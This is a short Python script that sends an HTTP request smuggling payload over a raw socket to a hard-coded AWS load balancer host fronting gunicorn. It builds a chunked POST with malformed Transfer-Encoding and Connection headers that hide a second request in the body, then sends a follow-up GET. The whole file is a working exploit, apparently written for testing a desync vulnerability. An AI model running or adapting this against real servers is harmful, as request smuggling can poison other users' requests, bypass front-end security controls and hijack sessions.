import socket
import time
host = 'gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com'
# host = input("Enter host name: ")
port = 80

pusher = f"""GET / HTTP/1.1
Host: {host}
Request: mustbeinlog

""".replace('\n','\r\n')

smuggle = f"""GET / HTTP/1.1
Host: {host}
Request: mustbeinbody

""".replace('\n','\r\n')

body = f"""0

POST / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(smuggle)}
Request: 2
Connection: keep-alive

Comm=""".replace('\n','\r\n')

header = f"""POST / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Request: 1
Connection : close
Transfer-Encoding : chunked

""".replace('\n','\r\n')
print("Sending request...")
print("-"*50)
print(header + body + smuggle + pusher)
print("-"*50)
request = (header + body + smuggle).encode()
printr = (header + body + smuggle + pusher).encode
print (printr)
print("-"*50)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(request)
    s.sendall(pusher.encode())
    responce = s.recv(4096)
    print(responce.decode())
